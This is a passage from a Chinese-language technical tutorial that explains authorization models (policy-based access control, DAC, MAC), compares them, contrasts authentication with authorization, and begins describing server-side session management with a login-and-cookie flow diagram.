</span><span id="__span-15-46"><a id="__codelineno-15-46" name="__codelineno-15-46" href="#__codelineno-15-46"></a>
</span><span id="__span-15-47"><a id="__codelineno-15-47" name="__codelineno-15-47" href="#__codelineno-15-47"></a><span class="n">company_network</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-15-48"><a id="__codelineno-15-48" name="__codelineno-15-48" href="#__codelineno-15-48"></a><span class="w">    </span><span class="n">net</span><span class="p">.</span><span class="n">cidr_contains</span><span class="p">(</span><span class="s2">&quot;10.0.0.0/8&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">input</span><span class="p">.</span><span class="n">environment</span><span class="p">.</span><span class="n">ip</span><span class="p">)</span>
</span><span id="__span-15-49"><a id="__codelineno-15-49" name="__codelineno-15-49" href="#__codelineno-15-49"></a><span class="p">}</span>
</span></code></pre></div></p>
<p><strong>决策流程：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>请求 → PEP → 提取上下文 → PDP → 加载策略 → 评估规则 → 决策
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>                ↓                        ↑
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>              PIP（属性查询）←------------┘
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>                ↓
</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>            返回结果 → PEP → 执行/拒绝 → 日志记录
</span></code></pre></div></p>
<p><strong>实际场景示例：</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>场景：企业文档管理系统
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>策略集合：
</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>
</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a># 基础访问策略
</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>policy &quot;document_owner_full_access&quot; {
</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>  effect = &quot;allow&quot;
</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>  resources = [&quot;document:*&quot;]
</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>  actions = [&quot;*&quot;]
</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>  condition = &quot;subject.id == resource.owner_id&quot;
</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>}
</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>
</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a># 分享策略
</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>policy &quot;shared_document_access&quot; {
</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>  effect = &quot;allow&quot;
</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>  resources = [&quot;document:*&quot;]
</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a>  actions = [&quot;read&quot;, &quot;comment&quot;]
</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a>  condition = &quot;subject.id in resource.shared_users&quot;
</span><span id="__span-17-19"><a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a>}
</span><span id="__span-17-20"><a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a>
</span><span id="__span-17-21"><a id="__codelineno-17-21" name="__codelineno-17-21" href="#__codelineno-17-21"></a># 时间限制策略
</span><span id="__span-17-22"><a id="__codelineno-17-22" name="__codelineno-17-22" href="#__codelineno-17-22"></a>policy &quot;business_hours_only&quot; {
</span><span id="__span-17-23"><a id="__codelineno-17-23" name="__codelineno-17-23" href="#__codelineno-17-23"></a>  effect = &quot;deny&quot;
</span><span id="__span-17-24"><a id="__codelineno-17-24" name="__codelineno-17-24" href="#__codelineno-17-24"></a>  principals = [&quot;role:contractor&quot;]
</span><span id="__span-17-25"><a id="__codelineno-17-25" name="__codelineno-17-25" href="#__codelineno-17-25"></a>  resources = [&quot;*&quot;]
</span><span id="__span-17-26"><a id="__codelineno-17-26" name="__codelineno-17-26" href="#__codelineno-17-26"></a>  actions = [&quot;*&quot;]
</span><span id="__span-17-27"><a id="__codelineno-17-27" name="__codelineno-17-27" href="#__codelineno-17-27"></a>  condition = &quot;!is_business_hours(environment.time)&quot;
</span><span id="__span-17-28"><a id="__codelineno-17-28" name="__codelineno-17-28" href="#__codelineno-17-28"></a>}
</span><span id="__span-17-29"><a id="__codelineno-17-29" name="__codelineno-17-29" href="#__codelineno-17-29"></a>
</span><span id="__span-17-30"><a id="__codelineno-17-30" name="__codelineno-17-30" href="#__codelineno-17-30"></a># 安全级别策略
</span><span id="__span-17-31"><a id="__codelineno-17-31" name="__codelineno-17-31" href="#__codelineno-17-31"></a>policy &quot;classified_document_access&quot; {
</span><span id="__span-17-32"><a id="__codelineno-17-32" name="__codelineno-17-32" href="#__codelineno-17-32"></a>  effect = &quot;allow&quot;
</span><span id="__span-17-33"><a id="__codelineno-17-33" name="__codelineno-17-33" href="#__codelineno-17-33"></a>  resources = [&quot;document:*&quot;]
</span><span id="__span-17-34"><a id="__codelineno-17-34" name="__codelineno-17-34" href="#__codelineno-17-34"></a>  actions = [&quot;read&quot;]
</span><span id="__span-17-35"><a id="__codelineno-17-35" name="__codelineno-17-35" href="#__codelineno-17-35"></a>  condition = &quot;&quot;&quot;
</span><span id="__span-17-36"><a id="__codelineno-17-36" name="__codelineno-17-36" href="#__codelineno-17-36"></a>    resource.classification == &quot;classified&quot; AND
</span><span id="__span-17-37"><a id="__codelineno-17-37" name="__codelineno-17-37" href="#__codelineno-17-37"></a>    subject.clearance_level &gt;= resource.required_clearance AND
</span><span id="__span-17-38"><a id="__codelineno-17-38" name="__codelineno-17-38" href="#__codelineno-17-38"></a>    subject.completed_training == true
</span><span id="__span-17-39"><a id="__codelineno-17-39" name="__codelineno-17-39" href="#__codelineno-17-39"></a>  &quot;&quot;&quot;
</span><span id="__span-17-40"><a id="__codelineno-17-40" name="__codelineno-17-40" href="#__codelineno-17-40"></a>}
</span><span id="__span-17-41"><a id="__codelineno-17-41" name="__codelineno-17-41" href="#__codelineno-17-41"></a>
</span><span id="__span-17-42"><a id="__codelineno-17-42" name="__codelineno-17-42" href="#__codelineno-17-42"></a># 地理限制策略
</span><span id="__span-17-43"><a id="__codelineno-17-43" name="__codelineno-17-43" href="#__codelineno-17-43"></a>policy &quot;geo_restriction&quot; {
</span><span id="__span-17-44"><a id="__codelineno-17-44" name="__codelineno-17-44" href="#__codelineno-17-44"></a>  effect = &quot;deny&quot;
</span><span id="__span-17-45"><a id="__codelineno-17-45" name="__codelineno-17-45" href="#__codelineno-17-45"></a>  resources = [&quot;document:confidential:*&quot;]
</span><span id="__span-17-46"><a id="__codelineno-17-46" name="__codelineno-17-46" href="#__codelineno-17-46"></a>  actions = [&quot;download&quot;]
</span><span id="__span-17-47"><a id="__codelineno-17-47" name="__codelineno-17-47" href="#__codelineno-17-47"></a>  condition = &quot;environment.country not in [&#39;US&#39;, &#39;CN&#39;]&quot;
</span><span id="__span-17-48"><a id="__codelineno-17-48" name="__codelineno-17-48" href="#__codelineno-17-48"></a>}
</span></code></pre></div>
<p><strong>优点：</strong>
- ✅ 策略集中管理，统一决策
- ✅ 支持复杂业务逻辑
- ✅ 策略与代码分离，易于更新
- ✅ 可扩展性强
- ✅ 支持策略版本控制和审计
- ✅ 可以组合多种授权模型</p>
<p><strong>缺点：</strong>
- ❌ 需要额外的策略引擎基础设施
- ❌ 策略语言学习成本
- ❌ 性能开销（策略评估）
- ❌ 调试复杂策略困难
- ❌ 可能的单点故障（PDP）</p>
<p><strong>适用场景：</strong>
- 微服务架构（统一授权）
- 需要频繁调整权限规则的系统
- 多种授权模型共存的场景
- 云原生应用
- 需要细粒度审计的系统
- 金融、政府等强监管行业</p>
<hr />
<h3 id="5-其他授权模型">5. 其他授权模型<a class="headerlink" href="#5-其他授权模型" title="链接到此标题">&para;</a></h3>
<h4 id="dac自主访问控制---discretionary-access-control">DAC（自主访问控制 - Discretionary Access Control）<a class="headerlink" href="#dac自主访问控制---discretionary-access-control" title="链接到此标题">&para;</a></h4>
<p><strong>核心概念：</strong>
资源的所有者有权决定谁可以访问该资源。</p>
<p><strong>特点：</strong>
- 资源创建者自动成为所有者
- 所有者可以授予/撤销他人的访问权限
- 权限可以传递</p>
<p><strong>典型应用：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>文件系统：用户可以chmod/chown自己的文件
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>社交媒体：用户设置帖子的可见范围（公开/好友/私密）
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>云盘：文件所有者分享给他人
</span></code></pre></div></p>
<h4 id="mac强制访问控制---mandatory-access-control">MAC（强制访问控制 - Mandatory Access Control）<a class="headerlink" href="#mac强制访问控制---mandatory-access-control" title="链接到此标题">&para;</a></h4>
<p><strong>核心概念：</strong>
由系统强制执行的访问控制，用户无法改变。基于安全标签和安全级别。</p>
<p><strong>多级安全模型（Bell-LaPadula）：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>安全级别：绝密(Top Secret) &gt; 机密(Secret) &gt; 内部(Confidential) &gt; 公开(Public)
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>规则：
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>- No Read Up：用户不能读取高于自己级别的信息
</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>- No Write Down：用户不能写入低于自己级别的信息
</span></code></pre></div></p>
<p><strong>典型应用：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>军事系统：严格的分级保护
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>SELinux：Linux强制访问控制
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>数据库行级安全：基于标签的强制隔离
</span></code></pre></div></p>
<hr />
<h3 id="授权模型对比">授权模型对比<a class="headerlink" href="#授权模型对比" title="链接到此标题">&para;</a></h3>
<table>
<thead>
<tr>
<th>维度</th>
<th>ACL</th>
<th>RBAC</th>
<th>ABAC</th>
<th>PBAC</th>
<th>DAC</th>
<th>MAC</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>复杂度</strong></td>
<td>低</td>
<td>中</td>
<td>高</td>
<td>高</td>
<td>低</td>
<td>中</td>
</tr>
<tr>
<td><strong>灵活性</strong></td>
<td>低</td>
<td>中</td>
<td>极高</td>
<td>高</td>
<td>中</td>
<td>低</td>
</tr>
<tr>
<td><strong>管理成本</strong></td>
<td>高（资源多时）</td>
<td>低</td>
<td>中</td>
<td>中</td>
<td>低</td>
<td>低</td>
</tr>
<tr>
<td><strong>性能影响</strong></td>
<td>低</td>
<td>低</td>
<td>中-高</td>
<td>中</td>
<td>低</td>
<td>低</td>
</tr>
<tr>
<td><strong>扩展性</strong></td>
<td>差</td>
<td>良好</td>
<td>优秀</td>
<td>优秀</td>
<td>一般</td>
<td>一般</td>
</tr>
<tr>
<td><strong>细粒度控制</strong></td>
<td>优秀</td>
<td>一般</td>
<td>优秀</td>
<td>优秀</td>
<td>优秀</td>
<td>一般</td>
</tr>
<tr>
<td><strong>动态权限</strong></td>
<td>不支持</td>
<td>不支持</td>
<td>支持</td>
<td>支持</td>
<td>不支持</td>
<td>不支持</td>
</tr>
<tr>
<td><strong>学习曲线</strong></td>
<td>平缓</td>
<td>平缓</td>
<td>陡峭</td>
<td>陡峭</td>
<td>平缓</td>
<td>中等</td>
</tr>
<tr>
<td><strong>审计能力</strong></td>
<td>一般</td>
<td>良好</td>
<td>优秀</td>
<td>优秀</td>
<td>一般</td>
<td>优秀</td>
</tr>
<tr>
<td><strong>典型场景</strong></td>
<td>文件系统</td>
<td>企业应用</td>
<td>云平台</td>
<td>微服务</td>
<td>个人文件</td>
<td>军事系统</td>
</tr>
<tr>
<td><strong>适用规模</strong></td>
<td>小型</td>
<td>中大型</td>
<td>大型</td>
<td>大型</td>
<td>小型</td>
<td>中型</td>
</tr>
</tbody>
</table>
<p><strong>选择建议：</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>场景驱动选择：
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>1. 小型应用、原型系统
</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>   → ACL（简单够用）
</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>
</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>2. 企业内部系统、SaaS产品
</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>   → RBAC（成熟稳定）
</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>
</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>3. 复杂权限、跨组织协作
</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>   → ABAC（灵活强大）
</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a>
</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>4. 微服务、云原生、多模型组合
</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a>   → PBAC（统一决策）
</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a>
</span><span id="__span-21-15"><a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a>5. 个人文件、用户生成内容
</span><span id="__span-21-16"><a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a>   → DAC（用户自主）
</span><span id="__span-21-17"><a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a>
</span><span id="__span-21-18"><a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a>6. 高安全要求、军事/政府
</span><span id="__span-21-19"><a id="__codelineno-21-19" name="__codelineno-21-19" href="#__codelineno-21-19"></a>   → MAC（强制保护）
</span><span id="__span-21-20"><a id="__codelineno-21-20" name="__codelineno-21-20" href="#__codelineno-21-20"></a>
</span><span id="__span-21-21"><a id="__codelineno-21-21" name="__codelineno-21-21" href="#__codelineno-21-21"></a>混合使用：
</span><span id="__span-21-22"><a id="__codelineno-21-22" name="__codelineno-21-22" href="#__codelineno-21-22"></a>实际系统常常组合多种模型
</span><span id="__span-21-23"><a id="__codelineno-21-23" name="__codelineno-21-23" href="#__codelineno-21-23"></a>例如：RBAC（基础权限）+ ABAC（动态规则）+ ACL（特殊资源）
</span></code></pre></div>
<hr />
<h2 id="认证与授权的区别">认证与授权的区别<a class="headerlink" href="#认证与授权的区别" title="链接到此标题">&para;</a></h2>
<table>
<thead>
<tr>
<th>维度</th>
<th>认证（Authentication）</th>
<th>授权（Authorization）</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>核心问题</strong></td>
<td>你是谁？</td>
<td>你能做什么？</td>
</tr>
<tr>
<td><strong>目的</strong></td>
<td>验证身份</td>
<td>控制访问</td>
</tr>
<tr>
<td><strong>时机</strong></td>
<td>首先执行</td>
<td>认证成功后执行</td>
</tr>
<tr>
<td><strong>输入</strong></td>
<td>用户名+密码/令牌</td>
<td>用户身份+请求资源</td>
</tr>
<tr>
<td><strong>输出</strong></td>
<td>身份确认（是/否）</td>
<td>访问决策（允许/拒绝）</td>
</tr>
<tr>
<td><strong>实现方式</strong></td>
<td>登录、SSO、OAuth</td>
<td>RBAC、ACL、策略引擎</td>
</tr>
<tr>
<td><strong>HTTP状态码</strong></td>
<td>401 Unauthorized</td>
<td>403 Forbidden</td>
</tr>
</tbody>
</table>
<p><strong>实际流程示例：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>1. 用户访问受保护资源
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>2. 系统检查是否已认证 → 未认证 → 跳转登录页（认证）
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>3. 用户输入用户名+密码
</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>4. 系统验证凭证 → 认证成功 → 建立会话
</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>5. 系统检查用户权限 → 检查授权策略（授权）
</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>6. 授权通过 → 返回资源 | 授权失败 → 返回403错误
</span></code></pre></div></p>
<hr />
<h2 id="会话管理">会话管理<a class="headerlink" href="#会话管理" title="链接到此标题">&para;</a></h2>
<h3 id="为什么需要会话why-session">为什么需要会话？（Why Session？）<a class="headerlink" href="#为什么需要会话why-session" title="链接到此标题">&para;</a></h3>
<p>HTTP是**无状态协议**（Stateless Protocol），这意味着：
- 服务器无法识别两次请求是否来自同一用户
- 每个请求都是独立的，服务器处理完就"忘记"了
- 无法维护用户的登录状态和上下文信息</p>
<p>**会话管理**通过在多个请求间维护用户状态来解决这个问题，让服务器能够"记住"用户。</p>
<p><strong>典型场景：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>场景：用户浏览电商网站
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>1. 用户登录 → 服务器需要记住&quot;这个用户已登录&quot;
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>2. 浏览商品 → 服务器需要知道&quot;这是之前登录的那个用户&quot;
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>3. 加入购物车 → 需要把商品关联到&quot;这个用户的购物车&quot;
</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>4. 结算付款 → 需要确认&quot;这是同一个登录用户&quot;
</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>
</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>没有会话管理，每次请求都需要重新登录！
</span></code></pre></div></p>
<hr />
<h2 id="1-基于服务器的会话session">1. 基于服务器的会话（Session）<a class="headerlink" href="#1-基于服务器的会话session" title="链接到此标题">&para;</a></h2>
<h3 id="11-session核心概念what">1.1 Session核心概念（What）<a class="headerlink" href="#11-session核心概念what" title="链接到此标题">&para;</a></h3>
<p>**Session**是服务器端存储的用户会话数据，通过**SessionID**与客户端关联。</p>
<p><strong>核心组成：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>Session = SessionID + SessionData
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>SessionID（会话标识）：
</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>- 唯一标识一个会话
</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>- 通常是一个随机字符串
</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>- 示例：3F2504E0-4F89-41D3-9A0C-0305E82C3301
</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>
</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>SessionData（会话数据）：
</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>- 用户信息：userId, username, roles
</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>- 业务数据：购物车、浏览历史
</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>- 状态信息：登录时间、最后活动时间
</span></code></pre></div></p>
<h3 id="12-session工作原理how">1.2 Session工作原理（How）<a class="headerlink" href="#12-session工作原理how" title="链接到此标题">&para;</a></h3>
<p><strong>完整流程：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>┌─────────┐                                    ┌─────────┐
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>│  客户端  │                                    │  服务器  │
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>└────┬────┘                                    └────┬────┘
</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>     │                                              │
</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>     │  1. POST /login                             │
</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>     │     username=zhang&amp;password=***             │
</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>     ├────────────────────────────────────────────&gt;│
</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>     │                                              │
</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>     │                                              │  2. 验证凭证
</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a>     │                                              │  3. 创建Session对象
</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a>     │                                              │     session = {
</span><span id="__span-25-12"><a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a>     │                                              │       userId: 1001,
</span><span id="__span-25-13"><a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a>     │                                              │       username: &quot;zhang&quot;,
</span><span id="__span-25-14"><a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a>     │                                              │       loginTime: &quot;2024-...&quot;
</span><span id="__span-25-15"><a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a>     │                                              │     }
</span><span id="__span-25-16"><a id="__codelineno-25-16" name="__codelineno-25-16" href="#__codelineno-25-16"></a>     │                                              │  4. 生成SessionID
</span><span id="__span-25-17"><a id="__codelineno-25-17" name="__codelineno-25-17" href="#__codelineno-25-17"></a>     │                                              │     sessionId = UUID.random()
</span><span id="__span-25-18"><a id="__codelineno-25-18" name="__codelineno-25-18" href="#__codelineno-25-18"></a>     │                                              │  5. 存储Session
</span><span id="__span-25-19"><a id="__codelineno-25-19" name="__codelineno-25-19" href="#__codelineno-25-19"></a>     │                                              │     storage.put(sessionId, session)
</span><span id="__span-25-20"><a id="__codelineno-25-20" name="__codelineno-25-20" href="#__codelineno-25-20"></a>     │                                              │
</span><span id="__span-25-21"><a id="__codelineno-25-21" name="__codelineno-25-21" href="#__codelineno-25-21"></a>     │  6. 返回响应 + Set-Cookie                    │
</span><span id="__span-25-22"><a id="__codelineno-25-22" name="__codelineno-25-22" href="#__codelineno-25-22"></a>     │     Set-Cookie: JSESSIONID=abc123; HttpOnly │
</span><span id="__span-25-23"><a id="__codelineno-25-23" name="__codelineno-25-23" href="#__codelineno-25-23"></a>     │&lt;────────────────────────────────────────────┤
</span><span id="__span-25-24"><a id="__codelineno-25-24" name="__codelineno-25-24" href="#__codelineno-25-24"></a>     │                                              │
</span><span id="__span-25-25"><a id="__codelineno-25-25" name="__codelineno-25-25" href="#__codelineno-25-25"></a>     │  7. 浏览器保存Cookie                         │
</span><span id="__span-25-26"><a id="__codelineno-25-26" name="__codelineno-25-26" href="#__codelineno-25-26"></a>     │     Cookie: JSESSIONID=abc123               │
</span><span id="__span-25-27"><a id="__codelineno-25-27" name="__codelineno-25-27" href="#__codelineno-25-27"></a>     │                                              │
</span><span id="__span-25-28"><a id="__codelineno-25-28" name="__codelineno-25-28" href="#__codelineno-25-28"></a>     │  8. GET /api/profile                        │
</span><span id="__span-25-29"><a id="__codelineno-25-29" name="__codelineno-25-29" href="#__codelineno-25-29"></a>     │     Cookie: JSESSIONID=abc123               │
</span><span id="__span-25-30"><a id="__codelineno-25-30" name="__codelineno-25-30" href="#__codelineno-25-30"></a>     ├────────────────────────────────────────────&gt;│
</span><span id="__span-25-31"><a id="__codelineno-25-31" name="__codelineno-25-31" href="#__codelineno-25-31"></a>     │                                              │
</span><span id="__span-25-32"><a id="__codelineno-25-32" name="__codelineno-25-32" href="#__codelineno-25-32"></a>     │                                              │  9. 提取SessionID
</span><span id="__span-25-33"><a id="__codelineno-25-33" name="__codelineno-25-33" href="#__codelineno-25-33"></a>     │                                              │  10. 查找Session
</span><span id="__span-25-34"><a id="__codelineno-25-34" name="__codelineno-25-34" href="#__codelineno-25-34"></a>     │                                              │      session = storage.get(&quot;abc123&quot;)
</span><span id="__span-25-35"><a id="__codelineno-25-35" name="__codelineno-25-35" href="#__codelineno-25-35"></a>     │                                              │  11. 验证Session有效性
</span><span id="__span-25-36"><a id="__codelineno-25-36" name="__codelineno-25-36" href="#__codelineno-25-36"></a>     │                                              │  12. 获取用户信息
</span><span id="__span-25-37"><a id="__codelineno-25-37" name="__codelineno-25-37" href="#__codelineno-25-37"></a>     │                                              │
</span><span id="__span-25-38"><a id="__codelineno-25-38" name="__codelineno-25-38" href="#__codelineno-25-38"></a>     │  13. 返回用户数据                            │
</span><span id="__span-25-39"><a id="__codelineno-25-39" name="__codelineno-25-39" href="#__codelineno-25-39"></a>     │&lt;────────────────────────────────────────────┤
</span><span id="__span-25-40"><a id="__codelineno-25-40" name="__codelineno-25-40" href="#__codelineno-25-40"></a>     │                                              │
</span></code></pre></div></p>
<p><strong>关键步骤说明：</strong></p>
<ol>
<li>
<p><strong>Session创建</strong>
   <div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>用户登录成功后：
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>- 生成唯一的SessionID（通常使用UUID或安全随机数）
</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>- 创建Session对象，存储用户信息
</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>- 将Session对象保存到存储介质（内存/Redis/数据库）
</span></code></pre></div></p>
</li>
<li>
<p><strong>SessionID传递</strong>
   <div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>方式1：Cookie（最常用）
